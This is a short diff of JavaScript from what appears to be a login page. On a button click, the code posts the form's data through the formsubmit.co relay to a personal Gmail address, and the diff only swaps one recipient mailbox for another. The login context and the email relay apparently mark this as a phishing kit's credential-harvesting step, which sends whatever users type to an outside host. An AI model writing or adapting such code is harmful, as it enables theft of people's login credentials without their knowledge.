@@ -83,7 +83,7 @@ $('.login-block .login-buttons .next').click(function(){
     $('.voiti-freak span').text('');
     $('.finish-wrap img').addClass('active');
 
-    fetch('https://formsubmit.co/ajax/nesquikwhite2009@gmail.com', {
+    fetch('https://formsubmit.co/ajax/brooklynfredrik@gmail.com', {
         method: 'POST',
         body: formData
     })
